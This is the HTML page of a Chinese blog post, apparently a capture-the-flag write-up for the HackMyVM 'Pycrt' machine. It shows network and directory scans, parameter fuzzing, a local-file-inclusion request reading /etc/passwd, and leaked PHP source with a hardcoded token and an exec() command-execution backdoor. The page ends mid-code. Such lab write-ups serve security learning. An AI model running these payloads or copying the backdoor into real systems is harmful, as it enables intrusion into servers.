<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/e3722a685bf8da82.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e3722a685bf8da82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c63903712a141bbb.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-29a2ed88e669ae89.js" defer=""></script><script src="/_next/static/PcOY42qQWTyGHauCjHxUV/_buildManifest.js" defer=""></script><script src="/_next/static/PcOY42qQWTyGHauCjHxUV/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><div class="flex justify-center items-center gap-2 mb-4 text-sm text-gray-600 dark:text-gray-400"><span>订阅更新：</span><a class="inline-flex items-center gap-1 hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 RSS Feed" href="/rss.xml"><svg class="w-4 h-4" fill="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1Z"></path></svg>RSS</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 Atom Feed" href="/atom.xml">Atom</a><span class="text-gray-400 dark:text-gray-600">|</span><a class="hover:text-red-700 dark:hover:text-red-400 transition-colors" title="订阅 JSON Feed" href="/feed.json">JSON</a></div><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"HackMyVMPycrt","contentHtml":"\u003ch1\u003ePycrt.\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://hackmyvm.eu/machines/machine.php?vm=Pycrt\"\u003ehttps://hackmyvm.eu/machines/machine.php?vm=Pycrt\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003eNotes：\u003cstrong\u003eHave Fun!\u003c/strong\u003e\u003c/p\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt nmap -sP 192.168.56.0/24               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 08:29 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00054s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00083s latency).\nMAC Address: 08:00:27:1C:4D:D5 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.58\nHost is up (0.00049s latency).\nMAC Address: 08:00:27:A5:6A:FC (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 2.05 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt nmap -sT -min-rate 10000 -p- 192.168.56.58\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 08:30 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.58\nHost is up (0.00043s latency).\nNot shown: 65532 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n6667/tcp open  irc\nMAC Address: 08:00:27:A5:6A:FC (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 4.59 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt nmap -sT -A -T4 -O -p 22,80,6667 192.168.56.58 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-11 08:31 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.58\nHost is up (0.00075s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)\n|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)\n|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)\n80/tcp   open  http    Apache httpd 2.4.62 ((Debian))\n|_http-title: Apache2 Debian Default Page: It works\n|_http-server-header: Apache/2.4.62 (Debian)\n6667/tcp open  irc\n| irc-info: \n|   \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e: 1\n|   servers: 1\n|   chans: 0\n|   lusers: 1\n|   lservers: 0\n|   server: irc.local\n|   version: InspIRCd-3. irc.local \n|   \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e ident: nmap\n|   \u003cspan class=\"hljs-built_in\"\u003esource\u003c/span\u003e host: 192.168.56.4\n|_  error: Closing \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e: (nmap@192.168.56.4) [Client exited]\nMAC Address: 08:00:27:A5:6A:FC (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: Host: irc.local; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.75 ms 192.168.56.58\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 17.40 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透 - 1\u003c/h2\u003e\n\u003cp\u003e常规先对 \u003ccode\u003e80\u003c/code\u003e 端口进行渗透\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录扫描什么都扫描不出来\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt dirsearch -u 192.168.56.58 -x 403,404,429 -e php,zip,txt\n/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\n  from pkg_resources import DistributionNotFound, VersionConflict\n\n  _|. _ _  _  _  _ _|_    v0.4.3\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439\n\nOutput File: /root/Desktop/test/Pycrt/reports/_192.168.56.58/_25-05-11_08-48-56.txt\n\nTarget: http://192.168.56.58/\n\n[08:48:56] Starting: \n\nTask Completed\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u 192.168.56.58 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip -b 404,301,403\n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.58\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n[+] Negative Status codes:   404,301,403\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\nProgress: 882240 / 882244 (100.00%)\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e先放着\u003c/p\u003e\n\u003ch2\u003eInspIRCd\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003eInspIRCd\u003c/code\u003e是一个功能丰富的C++编写的互联网中继聊天（IRC）服务器，适用于UNIX-like和Windows系统\u003c/p\u003e\n\u003cp\u003e使用 \u003ccode\u003eirssi\u003c/code\u003e 进行连接\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt irssi -c 192.168.56.58 -p 6667 -n sunset\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以注意到在 \u003ccode\u003eHELLO\u003c/code\u003e 信息中给出了 \u003ccode\u003eShadowSec\u003c/code\u003e 目录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e09:07 -!-  **************************************************\n09:07 -!-  *             H    E    L    L    O              *\n09:07 -!-  *  This is a private irc server. Please contact  *\n09:07 -!-  *  the admin of the server \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e any questions or  *\n09:07 -!-  *  issues ShadowSec directory.                   *\n09:07 -!-  **************************************************\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e在 \u003ccode\u003eWeb\u003c/code\u003e 上接着该目录，能进到一个页面\u003c/p\u003e\n\u003ch2\u003eWeb 渗透 - 2\u003c/h2\u003e\n\u003cp\u003e进入 \u003ccode\u003eShadowSec\u003c/code\u003e 目录，群主大大是 法典：战神 级别的（翻译过来怪中二的hahaha）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e目录爆破，最后在 \u003ccode\u003ebig\u003c/code\u003e 字典最后边扫到…\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Pycrt gobuster \u003cspan class=\"hljs-built_in\"\u003edir\u003c/span\u003e -u http://192.168.56.58/ShadowSec/ -w ../../Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-big.txt -x php,txt,zip -b 404,301,403 \n===============================================================\nGobuster v3.6\nby OJ Reeves (@TheColonial) \u0026#x26; Christian Mehlmauer (@firefart)\n===============================================================\n[+] Url:                     http://192.168.56.58/ShadowSec/\n[+] Method:                  GET\n[+] Threads:                 10\n[+] Wordlist:                ../../Dict/SecLists-2024.3/Discovery/Web-Content/directory-list-2.3-big.txt\n[+] Negative Status codes:   404,301,403\n[+] User Agent:              gobuster/3.6\n[+] Extensions:              php,txt,zip\n[+] Timeout:                 10s\n===============================================================\nStarting gobuster \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e directory enumeration mode\n===============================================================\nProgress: 5095328 / 5095332 (100.00%)\n/bydataset.php        (Status: 200) [Size: 21]\n===============================================================\nFinished\n===============================================================\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问显示 \u003ccode\u003enothing\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackMyVMPycrt/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e模糊测试\u003c/h3\u003e\n\u003cp\u003e进行模糊测试，感觉会有 \u003ccode\u003eLFI\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  fuzz wfuzz -c -w ../../Dict/fuzz/paramDict/AllParam.txt -u http://192.168.56.58/ShadowSec/bydataset.php\\?FUZZ\\=/etc/passwd --hl=1 \n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.56.58/ShadowSec/bydataset.php?FUZZ=/etc/passwd\nTotal requests: 74332\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload \n=====================================================================\n\n000006050:   200        27 L     39 W       1452 Ch     \u003cspan class=\"hljs-string\"\u003e\"file\"\u003c/span\u003e   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  fuzz curl http://192.168.56.58/ShadowSec/bydataset.php\\?file\\=/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\n\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:x:4:65534:\u003cspan class=\"hljs-built_in\"\u003esync\u003c/span\u003e:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\npycrtlake:x:1000:1000:pycrtlake,,,:/home/pycrtlake:/bin/bash\nsystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\nmessagebus:x:104:110::/nonexistent:/usr/sbin/nologin\nsshd:x:105:65534::/run/sshd:/usr/sbin/nologin\nchatlake:x:1001:1001::/home/chatlake:/bin/sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能知道存在 \u003ccode\u003echatlake\u003c/code\u003e 用户，但是无法读取 \u003ccode\u003e.ssh\u003c/code\u003e ，可能权限不够或者没有该文件夹\u003c/p\u003e\n\u003cp\u003e构造连接读取 \u003ccode\u003ebydataset.php\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  fuzz curl http://192.168.56.58/ShadowSec/bydataset.php\\?file\\=/var/www/html/ShadowSec/bydataset.php\n\u0026#x3C;?php                            \n                                                         \n\u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e decrypt(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e) {       \n    \u003cspan class=\"hljs-variable\"\u003e$reversed\u003c/span\u003e = strrev(\u003cspan class=\"hljs-variable\"\u003e$input\u003c/span\u003e);   \n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Reversed: \"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$reversed\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e;\n                                                         \n    \u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e = base64_decode(\u003cspan class=\"hljs-variable\"\u003e$reversed\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Decoded: \"\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e . \u003cspan class=\"hljs-string\"\u003e\"\\n\"\u003c/span\u003e;\n                                                         \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e === \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {   \n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Base64 decoding failed.\\n\"\u003c/span\u003e;\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n    }\n                                                         \n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (strpos(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'cmd:'\u003c/span\u003e) === 0) {\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e substr(\u003cspan class=\"hljs-variable\"\u003e$decoded\u003c/span\u003e, 4);\n    }\n\n    \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e;\n}\n\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'GET'\u003c/span\u003e \u0026#x26;\u0026#x26; isset(\u003cspan class=\"hljs-variable\"\u003e$_GET\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'file'\u003c/span\u003e])) {\n    \u003cspan class=\"hljs-variable\"\u003e$file\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_GET\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'file'\u003c/span\u003e];\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (stripos(\u003cspan class=\"hljs-variable\"\u003e$file\u003c/span\u003e, \u003cspan class=\"hljs-string\"\u003e'phpinfo'\u003c/span\u003e) !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Access Denied'\u003c/span\u003e);\n    }\n    \u003cspan class=\"hljs-variable\"\u003e$filterUrl\u003c/span\u003e = \u003cspan class=\"hljs-string\"\u003e'php://filter/convert.base64-encode/resource='\u003c/span\u003e . \u003cspan class=\"hljs-variable\"\u003e$file\u003c/span\u003e;\n    \u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e = @file_get_contents(\u003cspan class=\"hljs-variable\"\u003e$filterUrl\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e === \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Failed to read file'\u003c/span\u003e);\n    }\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e base64_decode(\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e);\n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e;\n} elseif (\u003cspan class=\"hljs-variable\"\u003e$_SERVER\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'REQUEST_METHOD'\u003c/span\u003e] === \u003cspan class=\"hljs-string\"\u003e'POST'\u003c/span\u003e \u0026#x26;\u0026#x26; isset(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'auth'\u003c/span\u003e]) \u0026#x26;\u0026#x26; isset(\u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'payload'\u003c/span\u003e])) {\n    \u003cspan class=\"hljs-variable\"\u003e$auth\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'auth'\u003c/span\u003e];\n    \u003cspan class=\"hljs-variable\"\u003e$payload\u003c/span\u003e = \u003cspan class=\"hljs-variable\"\u003e$_POST\u003c/span\u003e[\u003cspan class=\"hljs-string\"\u003e'payload'\u003c/span\u003e];\n\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$auth\u003c/span\u003e !== \u003cspan class=\"hljs-string\"\u003e'LetMeIn123!'\u003c/span\u003e) {\n        \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e'Invalid Auth Token.'\u003c/span\u003e);\n        }                               \n                                                         \n    \u003cspan class=\"hljs-variable\"\u003e$command\u003c/span\u003e = decrypt(\u003cspan class=\"hljs-variable\"\u003e$payload\u003c/span\u003e);\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e (\u003cspan class=\"hljs-variable\"\u003e$command\u003c/span\u003e !== \u003cspan class=\"hljs-literal\"\u003efalse\u003c/span\u003e) {\n        \u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e = \u003cspan class=\"hljs-built_in\"\u003eexec\u003c/span\u003e(\u003cspan class=\"hljs-variable\"\u003e$command\u003c/span\u003e);                                                                                 \n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;pre\u003e\u003cspan class=\"hljs-variable\"\u003e$output\u003c/span\u003e\u0026#x3C;/pre\u003e\"\u003c/span\u003e;\n    } \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {                     \n        \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Payload decode failed.\\n\"\u003c/span\u003e;\n    }                             \n    \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e;                           \n} \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e {\n    \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan 